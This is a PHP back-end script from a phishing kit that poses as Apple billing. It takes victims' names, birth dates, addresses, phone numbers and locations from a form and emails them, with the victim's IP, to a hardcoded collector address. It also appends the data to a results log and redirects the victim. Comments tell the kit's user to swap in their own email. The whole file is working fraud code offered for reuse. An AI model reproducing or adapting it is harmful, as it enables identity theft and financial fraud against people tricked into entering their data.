<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Mornag .= "------------+| Mornag [Mr Bear] Tunisia |+------------\n";
$Mornag .= "First Name                       : ".$_POST['first']."\n";
$Mornag .= "Last Name                    : ".$_POST['last']."\n";
$Mornag .= "Date of Birth               : ".$_POST['mon1']."/";
$Mornag .= "".$_POST['day2']."/";
$Mornag .= "".$_POST['yea3']."\n";
$Mornag .= "Address Line 1              : ".$_POST['addr123']."\n";
$Mornag .= "Phone N                     : ".$_POST['addr444']."\n";
$Mornag .= "Country                        : ".$_POST['country125']."\n";
$Mornag .= "Stat                    : ".$_POST['st70ate']."\n";
$Mornag .= "City                    : ".$_POST['ci66ty']."\n";
$Mornag .= "Zip                    : ".$_POST['zi002p']."\n";
$Mornag .= "------------+| Mornag [Mr Bear] Tunisia |+------------\n";
$Mornag .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "tiflil-adham@gmx.com"; // Change the email ===> Put ur email
$bilsub = "[MrBear] Billing Information from that ip $ip";
$bilhead = "From: Apple Billing Info [$ip] <APPLE@>"; // You can change the email for better rzl
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$Mornag,$bilhead);
$v = fopen("../rz/index.txt","a"); // Send rzl in TXT file 
fwrite($v,$Mornag);
fclose($v);

header("Location: ../hid.php"); // Redirecting
?>